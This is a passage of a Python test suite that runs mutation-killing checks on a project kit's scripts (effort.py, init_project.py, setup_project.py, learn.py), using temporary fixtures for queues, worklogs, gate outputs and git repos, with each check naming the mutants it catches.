    QUEUE = ("# QUEUE 2026-11-08\nChain: base=3 | T-100:+0 T-101:+0 | final=3\n\n## START BLOCK (paste once)\n"
             "```\nROLE: x\nLast line: QUEUE DONE\n```\nReturn line.\n")
    put(EF, ".hermes/plans/cards/QUEUE_2026-11-08.md", QUEUE)
    # kills effort.py:87 rows 32 (return 3), 33 (or -> and: a Traceback instead) and 82 (the ternary loses its `not`: the wrong message)
    rc, out = eff("block")
    check("effort.py `block` without --out on a queue that HAS a START BLOCK -> exit 3 and exactly 'block needs --out FILE' (a mutant returns 4, crashes on the None --out, or reports 'has no START BLOCK')",
          rc == 3 and out.strip() == "EFFORT none - block needs --out FILE", out)

    # kills effort.py:82 rows 74 (or -> and: 'no Chain: line' instead) and 80 (return 3 -> 4)
    rc, out = eff("queue", "nope.md")
    check("effort.py queue on a file that does not exist -> exit 3 and 'no queue file' (a mutant falls through to the 'no Chain: line' branch, or returns 4)",
          rc == 3 and "no queue file" in out and "no Chain: line" not in out, out)

    put(EF, ".hermes/plans/WORKLOG.md", "\n## T-100 | 2026-11-08T10:00:00+0200 | PASS | p\n## T-101 | 2026-11-08T10:00:00+0200 | PASS | p\n")
    # kills effort.py:90 row 34 (todo or ids -> todo and ids: an empty list and an IndexError)
    rc, out = eff("queue", ".hermes/plans/cards/QUEUE_2026-11-08.md")
    check("effort.py queue with an explicit file whose cards all have a WORKLOG entry -> exit 0 and the full line for the hardest of the ids (a mutant with `todo and ids` indexes an empty list)",
          rc == 0 and out.strip().startswith("EFFORT medium worker W4 queue QUEUE_2026-11-08.md, 2 card(s), hardest T-100: "), out)

    # kills effort.py:27 row 78 (and -> or: a blank line raises ValueError) and row 94 (split maxsplit 1 -> 2: a value holding '=' raises)
    put(EF, "tools/kit.env", auto.replace("TIMEOUT_S=900", "TIMEOUT_S=900\n\nNOTE=a=b"))
    rck1, ok1 = eff("stage")
    put(EF, "tools/kit.env", auto.replace("TIMEOUT_S=900", "TIMEOUT_S=900\n# note=1\n\n"))
    rck2, ok2 = eff("stage")
    put(EF, "tools/kit.env", auto)
    check("effort.py reads tools/kit.env line by line: 'KEY=a=b' keeps its '=', a blank line and a '#comment=1' line are skipped -> E4 medium twice and no Traceback (the unpacking mutants die here)",
          rck1 == 0 and rck2 == 0 and ok1.strip().startswith("EFFORT medium architect E4") and ok2.strip().startswith("EFFORT medium architect E4")
          and "Traceback" not in ok1 + ok2, (ok1, ok2))

    # ================= init_project.py =================
    # kills init_project.py:136 row 0 (return 2 -> 3)
    rc, out = ini()
    check("init_project.py with no target -> usage, a FIX line and exit 2 (a mutant returns 3)", rc == 2 and "FIX:" in out and "usage:" in out, out)

    notdir = work / "not_a_directory.txt"
    notdir.write_text("x\n", encoding="utf-8")
    # kills init_project.py:131 row 8 (return 2 -> 3)
    rc, out = ini("--check", str(notdir))
    check("init_project.py --check on a path that is not a directory -> exit 2 naming it (a mutant returns 3)", rc == 2 and "is not a directory" in out, out)

    # kills init_project.py:143 rows 23 (or -> and), 27 (80 -> 81), 28 (chr(13) -> chr(14)), 46 (chr(10) -> chr(11)), 48 (or -> and) and :145 row 54 (return 2 -> 3)
    r81, o81 = ini(str(work / "refuse_81"), "--name", "a" * 81)
    rnl, onl = ini(str(work / "refuse_nl"), "--owner", "a" + chr(10) + "b")
    rcr, ocr = ini(str(work / "refuse_cr"), "--owner", "a" + chr(13) + "b")
    check("init_project.py refuses --name of 81 chars, --owner holding LF and --owner holding CR -> exit 2 and REFUSED: for each, and writes nothing (mutants that miss the length, the LF or the CR test install instead)",
          r81 == 2 and rnl == 2 and rcr == 2 and all("REFUSED:" in o for o in (o81, onl, ocr))
          and not (work / "refuse_81").exists() and not (work / "refuse_nl").exists() and not (work / "refuse_cr").exists(), (o81, onl, ocr))

    # kills init_project.py:147 row 30 (parents=True -> False: the two missing parents) and 143 row 27 at its 80-char boundary
    rc, out = ini(str(work / "deep/nest/proj"), "--name", "a" * 80)
    check("init_project.py installs into a target whose two parent dirs do not exist (mkdir parents=True) and accepts a name of exactly 80 chars -> exit 0",
          rc == 0 and "INSTALLED into" in out and (work / "deep/nest/proj/tools/aw.py").is_file(), out)

    Q = work / "initcheck"
    rcq, oq = ini(str(Q), "--lang", "en")
    # kills init_project.py:148 row 9 (the `not` on the docs dir: a WARN on every install) and :105 row 35 (== -> != in the pick comprehension: 'matches docs/GUIDE.bg.md')
    rc1, c1 = ini("--check", str(Q))
    check("init_project.py install of a kit that HAS docs/GUIDE -> no 'WARN docs/' line, and --check on it -> exit 0, engine_diff=0 missing=0 and 'STATE .hermes/plans/GUIDE.md (edited after install)' (the installed guide is rendered, so it matches no raw guide)",
          rcq == 0 and "WARN docs/" not in oq and "INSTALLED into" in oq and rc1 == 0 and "engine_diff=0 missing=0" in c1
          and "(edited after install)" in c1 and "matches docs/GUIDE" not in c1, (oq[-200:], c1[-300:]))

    put(Q, ".hermes/plans/GUIDE.md", (KIT / "docs/GUIDE.en.md").read_bytes())
    # kills init_project.py:106 row 12 (pick[0] -> pick[1]: an IndexError when only one guide matches)
    rc2, c2 = ini("--check", str(Q))
    check("init_project.py --check on a project whose GUIDE.md is byte-identical to docs/GUIDE.en.md -> exit 0 and '(matches docs/GUIDE.en.md)' (a mutant indexes pick[1] and dies, or reports the bg guide)",
          rc2 == 0 and "(matches docs/GUIDE.en.md)" in c2, c2[-300:])

    n1 = int(c1.split("engine_same=")[1].split()[0]) if "engine_same=" in c1 else -1
    put(Q, "tools/aw.py", (Q / "tools/aw.py").read_bytes() + b"\n# drift\n")
    # kills init_project.py:95 row 34 (ok = == -> !=) and :97 row 17 (same += 2) and :100 row 50 (diff += 2)
    rc3, c3 = ini("--check", str(Q))
    n2 = int(c3.split("engine_same=")[1].split()[0]) if "engine_same=" in c3 else -2
    check("init_project.py --check after ONE engine file was changed: exit 1, 'DIFF tools/aw.py', engine_diff=1 and engine_same drops by exactly 1 (mutants that flip the comparison or double a counter change one of those numbers)",
          rc3 == 1 and "DIFF tools/aw.py" in c3 and "engine_diff=1" in c3 and n1 > 0 and n1 - n2 == 1, (n1, n2, c3[-200:]))

    (Q / "tools/effort.py").rename(Q / "tools/effort.py.off")
    (Q / "tools/kit.env").rename(Q / "tools/kit.env.off")
    # kills init_project.py:88 row 43 (missing += 2) and :84 row 15 (missing += 2 for a STATE file)
    rc4, c4 = ini("--check", str(Q))
    check("init_project.py --check with one ENGINE file and one STATE file gone -> exit 1, 'MISSING tools/effort.py', 'MISSING tools/kit.env' and missing=2 (a doubled counter says 3)",
          rc4 == 1 and "MISSING tools/effort.py" in c4 and "MISSING tools/kit.env" in c4 and "missing=2" in c4, c4[-300:])

    G = work / "guideproj"
    (G / ".hermes/plans").mkdir(parents=True, exist_ok=True)
    # kills init_project.py:180 row 52 (gdst.parent.mkdir exist_ok=True -> False: FileExistsError on the existing .hermes/plans)
    rg1, og1 = ini(str(G), "--lang", "en")
    gd = G / ".hermes/plans/GUIDE.md"
    check("init_project.py into a target that already has .hermes/plans and no GUIDE.md -> exit 0 and the guide written (mkdir with exist_ok=True; False raises FileExistsError)",
          rg1 == 0 and gd.is_file() and "INSTALLED into" in og1, (rg1, og1[-200:]))

    put(G, ".hermes/plans/GUIDE.md", gd.read_bytes() + b"\nEDITED-1\n")
    (G / "kit_stage/.hermes").mkdir(parents=True, exist_ok=True)
    # kills init_project.py:183 row 20 (!= -> ==: no staging at all), :187 row 41 (parents=True -> False: the missing 'plans' level) and :186 row 53 (dropping `not` skips the write)
    rg2, og2 = ini(str(G), "--lang", "en")
    kd = G / "kit_stage/.hermes/plans/GUIDE.md"
    check("init_project.py with an edited GUIDE.md -> a COLLISION line for .hermes/plans/GUIDE.md and the staged copy written under kit_stage/ where .hermes/ exists and plans/ does not (mutants skip the staging, fail on the missing level or never write the file)",
          rg2 == 0 and "COLLISION (merge by hand, backup first): .hermes/plans/GUIDE.md" in og2 and kd.is_file(), (rg2, og2[-300:]))

    kd.rename(G / "kit_stage/.hermes/plans/GUIDE.md.off")
    put(G, ".hermes/plans/GUIDE.md", gd.read_bytes() + b"\nEDITED-2\n")
    # kills init_project.py:187 row 10 (kd.parent.mkdir exist_ok True -> False: FileExistsError on the plans/ dir that is still there)
    rg3, og3 = ini(str(G), "--lang", "en")
    check("init_project.py when only kit_stage/.hermes/plans/GUIDE.md is gone and its directory is still there -> exit 0 and the file written again (mkdir exist_ok=True; False raises FileExistsError)",
          rg3 == 0 and kd.is_file(), (rg3, og3[-200:]))

    # ================= setup_project.py =================
    cfg = work / "gitconfig"
    cfg.write_text("[user]\n\tname = Test\n\temail = t@e.invalid\n", encoding="utf-8", newline="")
    senv = {"GIT_CONFIG_GLOBAL": str(cfg)}

    def setup(name, *extra):
        d = work / name
        d.mkdir(parents=True, exist_ok=True)
        return d, sh([py, "-B", SETUP, str(d), *extra], cwd=d, env=senv)

    # kills setup_project.py:12 rows 6 and 29 (the name argument), :27 row 2 (owner falls back to USERNAME), :24 row 3 (text=False: OWNER=b'Test'),
    #   :86 rows 4, 25, 26 ('git init: False'), :91 row 0 (the last line of the gate output), :94 row 7 (the second-to-last doctor line), :44 row 12 (init's second line)
    S1, (rcs, os1) = setup("setup_one", "plain_name")
    check("setup_project.py fresh install -> exit 0, 'PROJECT=plain_name  OWNER=Test', init's INSTALLED line, 'git init: True', 'GATE -> GATE OK count=', the LAST doctor line ('DOCTOR PASS', not the ratchet line above it) and the DONE banner",
          rcs == 0 and "PROJECT=plain_name  OWNER=Test  " in os1 and "INSTALLED into" in os1 and "git init: True" in os1
          and "GATE -> GATE OK count=" in os1 and "DOCTOR PASS warn=" in os1 and "DOCTOR OK ratchet:" not in os1
          and "DONE. plain_name is ready." in os1, (rcs, os1[-400:]))

    # kills setup_project.py:61 row 9 (dropping `not`: no IDEA.md at all), :85 row 16 (no git init), :83 row 19 (no .gitignore)
    idea = S1 / "IDEA.md"
    idea0 = idea.read_bytes() if idea.is_file() else b""
    env1 = (S1 / "tools/kit.env").read_bytes()
    check("setup_project.py fresh install writes IDEA.md with its template, tests/test_smoke.py, a .gitignore covering .env and a git repo",
          idea.is_file() and "write here, in your own words" in idea.read_text(encoding="utf-8") and (S1 / "tests/test_smoke.py").is_file()
          and (S1 / ".gitignore").is_file() and ".env" in (S1 / ".gitignore").read_text(encoding="utf-8") and (S1 / ".git").is_dir(), (idea0[:60],))

    # kills setup_project.py:41 row 1 (sys.exit(0) -> 1) and :40 row 21 (doctor[1] -> doctor[2]: IndexError)
    _, (rcs2, os2) = setup("setup_one", "plain_name")
    check("setup_project.py on an already-installed project -> exit 0, ALREADY INSTALLED plus the whole doctor output, and IDEA.md and tools/kit.env untouched (mutants exit 1 or raise IndexError)",
          rcs2 == 0 and "ALREADY INSTALLED" in os2 and "DOCTOR PASS warn=" in os2 and idea.read_bytes() == idea0
          and (S1 / "tools/kit.env").read_bytes() == env1, (rcs2, os2[-300:]))

    (work / "setup_tests/tests").mkdir(parents=True, exist_ok=True)
    # kills setup_project.py:54 row 28 (mkdir exist_ok=True -> False: FileExistsError on the tests dir the owner already has)
    _, (rcs3, os3) = setup("setup_tests")
    check("setup_project.py on a target that already has a tests/ dir -> exit 0 and DONE (mkdir exist_ok=True; False raises FileExistsError)",
          rcs3 == 0 and "DONE." in os3 and "Traceback" not in os3, (rcs3, os3[-300:]))


def section_gaps_mod2(work: Path):
    """Behaviour that a one-token change of learn.py, findings_lint.py, review_pack.py or worker_report.py could alter with the suite still green.
    Replays the survivors of wk/D2_learn.jsonl (45), wk/D2_findings.jsonl, wk/D2_review.jsonl and wk/D2_report.jsonl; every check names the rows it kills."""
    print("\n-- gaps, second series: learn.py, findings_lint.py, review_pack.py, worker_report.py")
    py = sys.executable
    LRN = str(KIT / "payload/tools/learn.py")
    FL = str(KIT / "payload/tools/findings_lint.py")
    RP = str(KIT / "payload/tools/review_pack.py")

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    def fx(name):
        d = work / name
        (d / ".hermes/plans").mkdir(parents=True, exist_ok=True)
        return d

    def lrn(d, *more):
        return sh([py, "-I", "-B", LRN, str(d), *more], cwd=work)

    def last(out):
        return out.replace(os.sep, "/").strip().splitlines()[-1] if out.strip() else ""

    # ================= learn.py: repeated feedback (the AUTOMATED guard window) =================
    f = fx("d2_fb_above")
    put(f, ".hermes/plans/ARCHITECT_FEEDBACK.md",
        "AUTOMATED by the check runner\n## 2026-11-03 | F-001 | skips RED | OPEN\n- Seen: x\n## 2026-11-04 | F-002 | Skips RED | APPLIED\n")
    rc, out = lrn(f)
    # kills learn.py:170 rows 3 (window start -1 -> -2), 75 (the cited line becomes v[1]) and 88 (enumerate start 1 -> 2 shifts the window)
    check("learn.py: AUTOMATED on the line ABOVE the first repeated heading does not suppress it -> repeated-feedback citing ARCHITECT_FEEDBACK.md:2 and LEARN SUGGEST 1 (a window one line wider, or one read from the second entry, stays silent)",
          rc == 0 and last(out) == "LEARN SUGGEST 1" and "repeated-feedback | 'skips red' x2, ARCHITECT_FEEDBACK.md:2" in out
          and "unstable-card" not in out and "Traceback" not in out, out)

    a = fx("d2_fb_once")
    put(a, ".hermes/plans/ARCHITECT_FEEDBACK.md", "## 2026-11-03 | F-001 | lonely topic | OPEN\n")
    rc_a, o_a = lrn(a)
    b = fx("d2_fb_head")
    put(b, ".hermes/plans/ARCHITECT_FEEDBACK.md", "## 2026-11-03 | F-001 | apply AUTOMATED check | OPEN\n## 2026-11-04 | F-002 | apply AUTOMATED check | APPLIED\n")
    rc_b, o_b = lrn(b)
    c = fx("d2_fb_next")
    put(c, ".hermes/plans/ARCHITECT_FEEDBACK.md", "## 2026-11-03 | F-001 | same topic | OPEN\n- Seen: AUTOMATED by the check\n## 2026-11-04 | F-002 | same topic | APPLIED\n")
    rc_c, o_c = lrn(c)
    # kills learn.py:170 rows 70 (len(v) >= 2 and -> or: one entry fires), 88 (window starts below the heading) and 75, 85 (window read from the second entry)
    check("learn.py: repeated-feedback needs TWO entries with the same topic (one heading is silent) and an AUTOMATED word on the heading or the line after the first one suppresses it (a wider or shifted window fires, or fires on a single entry)",
          rc_a == 0 and rc_b == 0 and rc_c == 0 and "repeated-feedback" not in o_a + o_b + o_c and "Traceback" not in o_a + o_b + o_c, o_a + o_b + o_c)

    d = fx("d2_fb_after")
    put(d, ".hermes/plans/ARCHITECT_FEEDBACK.md", "## 2026-11-03 | F-001 | same topic | OPEN\n- Seen: x\nAUTOMATED by the check\n## 2026-11-04 | F-002 | same topic | APPLIED\n")
    rc, out = lrn(d)
    # kills learn.py:170 rows 95 (the window end takes v[1]) and 99 (end +1 -> +2): AUTOMATED two lines below the heading is outside the guard
    check("learn.py: the AUTOMATED guard reads the heading and exactly ONE line after it -> an AUTOMATED line two below the first heading still fires repeated-feedback citing line 1 (a window that reaches two lines down, or up to the second entry, goes silent)",
          rc == 0 and last(out) == "LEARN SUGGEST 1" and "repeated-feedback | 'same topic' x2, ARCHITECT_FEEDBACK.md:1" in out
          and "unstable-card" not in out and "empty-pass" not in out and "Traceback" not in out, out)

    # ================= learn.py: ratchet lag (floor default, >= 10, last 12 lines, FAIL last line, newest first, 6 files) =================
    d = fx("d2_floor_default")
    put(d, ".aw/ratchet.json", "{}")
    put(d, ".hermes/plans/gate_output/g.txt", "GATE OK count=10\n")
    rc, out = lrn(d)
    # kills learn.py:111 row 7 (the min_tests default 0 -> 1) and :122 row 120 (the message reads best[1] instead of best[0])
    check("learn.py: a ratchet.json without min_tests defaults the floor to 0 -> ratchet-lag fires for a measured 10 with 'floor 0 vs measured 10 in g.txt' (a default of 1 leaves it 9 short and silent)",
          rc == 0 and last(out) == "LEARN SUGGEST 1" and "ratchet-lag | floor 0 vs measured 10 in g.txt" in out
          and "hot-file" not in out and "Traceback" not in out, out)

    a = fx("d2_floor_9")
    put(a, ".aw/ratchet.json", '{"min_tests": 0}')
    put(a, ".hermes/plans/gate_output/g.txt", "GATE OK count=9\n")
    rc_a, o_a = lrn(a)
    b = fx("d2_floor_10")
    put(b, ".aw/ratchet.json", '{"min_tests": 0}')
    put(b, ".hermes/plans/gate_output/g.txt", "GATE OK count=10\n")
    rc_b, o_b = lrn(b)
    # kills learn.py:121 row 16 (>= 10 -> >= 11)
    check("learn.py: ratchet-lag needs measured - floor >= 10 -> a measured 9 is silent and a measured 10 fires (the >= 11 mutant leaves the boundary case silent)",
          rc_a == 0 and "ratchet-lag" not in o_a and rc_b == 0 and "ratchet-lag | floor 0 vs measured 10 in g.txt" in o_b, o_a + o_b)

    a = fx("d2_tail_13")
    put(a, ".aw/ratchet.json", '{"min_tests": 0}')
    put(a, ".hermes/plans/gate_output/g.txt", "GATE OK count=50\n" + "\n".join(["pad"] * 12) + "\n")
    rc_a, o_a = lrn(a)
    b = fx("d2_tail_12")
    put(b, ".aw/ratchet.json", '{"min_tests": 0}')
    put(b, ".hermes/plans/gate_output/g.txt", "GATE OK count=50\n" + "\n".join(["pad"] * 11) + "\n")
    rc_b, o_b = lrn(b)
    # kills learn.py:116 row 37 (the tail slice -12 -> -13): a count line 13 lines above the end must stay unseen
    check("learn.py: ratchet-lag reads the last 12 lines of a gate file -> a count line 13 lines above the end is invisible, the same line 12 above it is found (a -13 slice reports 50 on the first fixture)",
          rc_a == 0 and "ratchet-lag" not in o_a and rc_b == 0 and "ratchet-lag | floor 0 vs measured 50 in g.txt" in o_b, o_a + o_b)

    d = fx("d2_gate_fail")
    put(d, ".aw/ratchet.json", '{"min_tests": 0}')
    put(d, ".hermes/plans/gate_output/g.txt", "GATE FAIL count=50 min=0\n")
    rc, out = lrn(d)
    # kills learn.py:118 row 51 (and -> or: a FAIL last line is accepted)
    check("learn.py: a gate file whose LAST line holds FAIL is not a passing measurement, even when it carries count=50 -> no ratchet-lag (an `or` there reports 50)",
          rc == 0 and "ratchet-lag" not in out and "Traceback" not in out, out)

    a = fx("d2_two_gates")
    put(a, ".aw/ratchet.json", '{"min_tests": 0}')
    put(a, ".hermes/plans/gate_output/old.txt", "GATE OK count=20\n")
    put(a, ".hermes/plans/gate_output/new.txt", "GATE OK count=40\n")
    t0 = time.time()
    os.utime(a / ".hermes/plans/gate_output/old.txt", (t0 - 100, t0 - 100))
    os.utime(a / ".hermes/plans/gate_output/new.txt", (t0, t0))
    rc_a, o_a = lrn(a)
    b = fx("d2_seven_gates")
    put(b, ".aw/ratchet.json", '{"min_tests": 0}')
    for i in range(6):
        put(b, ".hermes/plans/gate_output/n%d.txt" % i, "GATE OK\n")
        os.utime(b / (".hermes/plans/gate_output/n%d.txt" % i), (t0 - i, t0 - i))
    put(b, ".hermes/plans/gate_output/z.txt", "GATE OK count=50\n")
    os.utime(b / ".hermes/plans/gate_output/z.txt", (t0 - 100, t0 - 100))
    rc_b, o_b = lrn(b)
    # kills learn.py:115 rows 104 (reverse sort) and 113 (the [:6] cap)
    check("learn.py: the newest gate file is measured first and only the 6 newest are read -> 'in new.txt' and never old.txt, and a count in the 7th (oldest) of seven files stays unseen (an ascending sort names old.txt, a [:7] cap reports 50)",
          rc_a == 0 and "ratchet-lag | floor 0 vs measured 40 in new.txt" in o_a and "old.txt" not in o_a
          and rc_b == 0 and "ratchet-lag" not in o_b, o_a + o_b)

    if shutil.which("git"):
        d = fx("d2_stale")
        put(d, ".hermes/plans/gate_output/g.txt", "GATE OK\n")
        for n in ("a", "b", "c", "d"):
            put(d, n + ".py", "x = 1\n")
        sh(["git", "init", "-q"], cwd=d)
        sh(["git", "add", "a.py", "b.py", "c.py", "d.py"], cwd=d)
        t0 = time.time()
        os.utime(d / ".hermes/plans/gate_output/g.txt", (t0, t0))
        for n in ("a", "b", "c"):
            os.utime(d / (n + ".py"), (t0 + 50, t0 + 50))
        os.utime(d / "d.py", (t0 + 2.5, t0 + 2.5))
        rc, out = lrn(d)
        # kills learn.py:132 rows 55 (the +2 s tolerance -> +3: d.py drops out) and 44 (the e.g. slice [:3] -> [:4]: d.py is named)
        check("learn.py: the stale-gate tolerance is 2 s -> a tracked file 2.5 s newer than the newest gate output is one of FOUR, and the evidence names only the first three (a 3 s tolerance finds three; a [:4] slice prints d.py)",
              rc == 0 and last(out) == "LEARN SUGGEST 1"
              and "stale-gate | 4 tracked file(s) newer than the newest gate output, e.g. a.py, b.py, c.py |" in out and "d.py" not in out, out)
    else:
        skip("learn.py: the stale-gate tolerance is 2 s and the evidence names three of four", "no git on PATH")

    # ================= learn.py: hot files =================
    a = fx("d2_hot3")
    put(a, ".hermes/plans/WORKLOG.md", "\n".join(["- Files: app/x.py"] * 3) + "\n")
    rc_a, o_a = lrn(a)
    b = fx("d2_hot6")
    put(b, ".hermes/plans/WORKLOG.md", "\n".join(["- Files: app/x.py"] * 6) + "\n")
    rc_b, o_b = lrn(b)
    # kills learn.py:158 row 8 (+= 1 -> += 2: three mentions read as six and fire)
    check("learn.py: hot-file needs 6 mentions of one path -> three `- Files:` lines are silent and six fire with 'app/x.py touched in 6 worklog entries' (a doubled counter fires on the three)",
          rc_a == 0 and "hot-file" not in o_a and rc_b == 0 and "hot-file | app/x.py touched in 6 worklog entries" in o_b, o_a + o_b)

    d = fx("d2_hot4")
    put(d, ".hermes/plans/WORKLOG.md", "\n".join(["- Files: a.py b.py c.py d.py"] * 6) + "\n")
    rc, out = lrn(d)
    # kills learn.py:159 row 107 (the top-three slice [:3] -> [:4])
    check("learn.py: at most THREE hot files are reported -> four paths with six mentions each give LEARN SUGGEST 3 and d.py is never named (a [:4] slice reports four and names it)",
          rc == 0 and last(out) == "LEARN SUGGEST 3" and "hot-file | a.py touched in 6 worklog entries" in out and "d.py" not in out, out)

    d = fx("d2_hot9")
    hidden = "- Files: " + " ".join([".hermes/h%d.md" % i for i in range(1, 7)])
    put(d, ".hermes/plans/WORKLOG.md", "\n".join([hidden] * 7 + ["- Files: a.py b.py c.py"] * 6) + "\n")
    rc, out = lrn(d)
    # kills learn.py:159 row 117 (most_common(8) -> most_common(9): six hidden .hermes paths push c.py into the first three)
    check("learn.py: the eight most touched paths are taken BEFORE .hermes/ is filtered out -> six .hermes paths at 7 mentions plus a.py/b.py at 6 give two hot files, c.py is never named (a most_common(9) names it)",
          rc == 0 and last(out) == "LEARN SUGGEST 2" and "hot-file | a.py touched in 6 worklog entries" in out
          and "hot-file | b.py touched in 6 worklog entries" in out and "c.py" not in out, out)

    # ================= learn.py: family scan (which lines, how many cited) =================
    d = fx("d2_defer")
    put(d, ".hermes/plans/WORKLOG.md", "\n".join(["- Deferred: a", "- Deferred: b", "- deferred: c"]) + "\n")
    put(d, ".hermes/plans/QUESTIONS.md", "- Deferred: z\n")
    rc, out = lrn(d)
    # kills learn.py:57 row 9 (the e.g. slice [:3] -> [:4]) and :48 row 103 (enumerate start 1 -> 2: every cited line moves)
    check("learn.py: a recurring family cites the first three hits with their real line numbers -> '4 hits, e.g. WORKLOG.md:1, WORKLOG.md:2, WORKLOG.md:3' and no QUESTIONS.md (a [:4] slice lists the fourth, a shifted enumerate cites 2,3,4)",
          rc == 0 and last(out) == "LEARN SUGGEST 1" and "recurring-deferral | 4 hits, e.g. WORKLOG.md:1, WORKLOG.md:2, WORKLOG.md:3 |" in out
          and "QUESTIONS.md" not in out, out)

    a = fx("d2_txt_scan")
    for n in ("g1", "g2", "g3"):
        put(a, ".hermes/plans/gate_output/" + n + ".txt", "the build timed out\n")
    rc_a, o_a = lrn(a)
    b = fx("d2_md_prose")
    put(b, ".hermes/plans/WORKLOG.md", "\n".join(["we deferred it", "we deferred it again", "deferred once more"]) + "\n")
    rc_b, o_b = lrn(b)
    # kills learn.py:49 row 34 (the suffix test == -> !=: .txt drops to marker lines only, .md prose starts being scanned)
    check("learn.py: every line of a gate_output .txt is scanned while a register .md only gives its #/|/-/* lines -> three 'timed out' lines fire recurring-timeout and three undashed 'deferred' prose lines stay silent (a flipped suffix test keeps both quiet / makes them fire)",
          rc_a == 0 and "recurring-timeout | 3 hits, e.g. g1.txt:1, g2.txt:1, g3.txt:1" in o_a
          and rc_b == 0 and "recurring-deferral" not in o_b, o_a + o_b)

    # ================= learn.py: --write =================
    a = fx("d2_write1")
    put(a, ".hermes/plans/WORKLOG.md", "\n".join(["- Deferred: a", "- Deferred: b", "- Deferred: c"]) + "\n")
    rc_a, o_a = lrn(a, "--write")
    f = a / ".hermes/plans/LEARN_latest.md"
    txt = f.read_text(encoding="utf-8") if f.is_file() else ""
    b = fx("d2_write0")
    put(b, ".hermes/plans/WORKLOG.md", "clean\n")
    rc_b, o_b = lrn(b, "--write")
    f0 = b / ".hermes/plans/LEARN_latest.md"
    txt0 = f0.read_text(encoding="utf-8") if f0.is_file() else ""
    # kills learn.py:185 row 35 (out and X or Y -> out or X: the list itself lands in the file) and row 0 (or -> and: a non-empty run ends the file with LEARN OK)
    check("learn.py: --write ends LEARN_latest.md with 'LEARN SUGGEST 1' when it wrote one suggestion and with 'LEARN OK' when it wrote none (a `out or ...` prints the suggestion list itself, or 'LEARN SUGGEST 0' in the empty file)",
          rc_a == 0 and f.is_file() and txt.strip().splitlines()[-1] == "LEARN SUGGEST 1" and "- LEARN SUGGEST recurring-deferral | 3 hits" in txt
          and rc_b == 0 and f0.is_file() and txt0.strip().splitlines()[-1] == "LEARN OK", (txt[-200:], txt0[-200:]))

    # ================= learn.py: AGENTS.md steering budget =================
    a = fx("d2_agents6500")
    put(a, "AGENTS.md", "x" * 6500)
    rc_a, o_a = lrn(a)
    b = fx("d2_agents6501")
    put(b, "AGENTS.md", "x" * 6501)
    rc_b, o_b = lrn(b)
    # kills learn.py:178 row 18 (> 6500 -> > 6501: the 6501 case goes silent)
    check("learn.py: steering-sprawl needs AGENTS.md over 6500 chars -> exactly 6500 is silent and 6501 fires with 'AGENTS.md is 6501 chars (> 6500)' (a > 6501 test leaves the 6501 case silent)",
          rc_a == 0 and "steering-sprawl" not in o_a and rc_b == 0 and "steering-sprawl | AGENTS.md is 6501 chars (> 6500)" in o_b, o_a + o_b)

    # ================= learn.py: WORKLOG parsing =================
    def rows(pairs):
        return "\n".join("## 2026-11-03T10:%02d:00+02:00 | %s | %s" % (i, cid, st) for i, (cid, st) in enumerate(pairs)) + "\n"

    a = fx("d2_hf2")
    put(a, ".hermes/plans/WORKLOG.md", rows([("T-001", "FAIL"), ("T-002", "FAIL")] + [("T-00%d" % i, "PASS") for i in range(3, 11)]))
    rc_a, o_a = lrn(a)
    b = fx("d2_hf3")
    put(b, ".hermes/plans/WORKLOG.md", rows([("T-001", "FAIL"), ("T-002", "FAIL"), ("T-003", "FAIL")] + [("T-00%d" % i, "PASS") for i in range(4, 11)]))
    rc_b, o_b = lrn(b)
    # kills learn.py:92 row 52 (sum(1 for ...) -> sum(2 for ...): 2 of 10 read as 4) and :93 row 61 (fails * 5 -> * 6: 2 of 10 passes 2*6 > 10)
    check("learn.py: high-fail-rate counts each FAIL once and needs fails*5 > tot -> 2 FAIL of 10 runs is silent, 3 FAIL of 10 fires '3/10 worklog runs FAIL/STOP' (a doubled counter or a *6 multiplier fires on the first fixture)",
          rc_a == 0 and "high-fail-rate" not in o_a and "unstable-card" not in o_a
          and rc_b == 0 and "high-fail-rate | 3/10 worklog runs FAIL/STOP" in o_b, o_a + o_b)

    d = fx("d2_cardfirst")
    put(d, ".hermes/plans/WORKLOG.md", "## T-004 | 2026-11-03T10:00:00+02:00 | FAIL\n## T-004 | 2026-11-03T11:00:00+02:00 | FAIL\n")
    rc, out = lrn(d)
    # kills learn.py:76 row 106 (ln[3:] -> ln[4:]: a card-first heading loses its id), :90 row 89 (bad[0][1] -> bad[0][2]: IndexError) and :71 row 10 (enumerate start 1 -> 2: the cited line moves)
    check("learn.py: a WORKLOG heading written card-first ('## T-004 | date | FAIL') is read like any other -> unstable-card citing WORKLOG.md:1 with 2 of 2 runs (a ln[4:] slice loses the id, an index 2 raises, a start of 2 cites line 2)",
          rc == 0 and last(out) == "LEARN SUGGEST 1" and "unstable-card | T-004: 2 FAIL/STOP of 2 runs, WORKLOG.md:1" in out
          and "third-fail" not in out and "Traceback" not in out, out)

    d = fx("d2_noid")
    put(d, ".hermes/plans/WORKLOG.md", "## 2026-11-03 | FAIL | note\n")
    rc, out = lrn(d)
    # kills learn.py:79 row 77 (st and cid -> or: a heading with no card id is recorded under None and the replace search raises)
    check("learn.py: a heading with a status but no card id is ignored -> LEARN OK and no Traceback (an `or` there records id None and dies in re.escape on the next loop)",
          rc == 0 and last(out) == "LEARN OK" and "unstable-card" not in out and "Traceback" not in out, out)

    d = fx("d2_indent")
    put(d, ".hermes/plans/WORKLOG.md", " ## 2026-11-03T10:00:00+02:00 | T-008 | FAIL\n ## 2026-11-03T11:00:00+02:00 | T-008 | FAIL\n")
    rc, out = lrn(d)
    # kills learn.py:75 row 45 (and -> or: an indented row holding a pipe is read as a heading)
    check("learn.py: only a line that STARTS with '## ' and holds a pipe is a WORKLOG heading -> two indented FAIL rows stay unread (LEARN OK; an `or` reads them as two runs of T-008 and fires unstable-card)",
          rc == 0 and last(out) == "LEARN OK" and "unstable-card" not in out and "Traceback" not in out, out)

    d = fx("d2_empty")
    put(d, ".hermes/plans/WORKLOG.md", "## 2026-11-03T10:00:00+02:00 | T-001 | PASS\n- Files: none\n")
    rc, out = lrn(d)
    # kills learn.py:71 row 10 (enumerate start 1 -> 2: the citation moves to line 3)
    check("learn.py: empty-pass cites the `- Files:` line that follows the PASS -> 'T-001 PASS lists no changed file, WORKLOG.md:2' (a start of 2 cites line 3)",
          rc == 0 and "empty-pass | T-001 PASS lists no changed file, WORKLOG.md:2" in out
          and "third-fail" not in out and "Traceback" not in out, out)

    d = fx("d2_third")
